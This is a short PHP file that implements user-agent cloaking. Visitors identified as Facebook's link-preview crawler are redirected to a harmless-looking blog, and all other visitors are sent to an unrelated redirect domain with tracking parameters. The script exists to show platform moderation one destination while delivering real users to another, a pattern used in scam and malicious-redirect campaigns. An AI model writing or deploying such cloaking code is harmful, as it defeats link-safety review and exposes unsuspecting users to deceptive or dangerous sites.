<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];

if (preg_match('/facebookexternalhit/si',$ua)) { 
header('Location: https://qczaj.pl/blog/'); 
die() ; 
} 

/* Redirect browser */
header("Location: http://ct-redirect.xyz/h6akD?a=6226&o=5012&s=17-07");
 exit;
?>
?>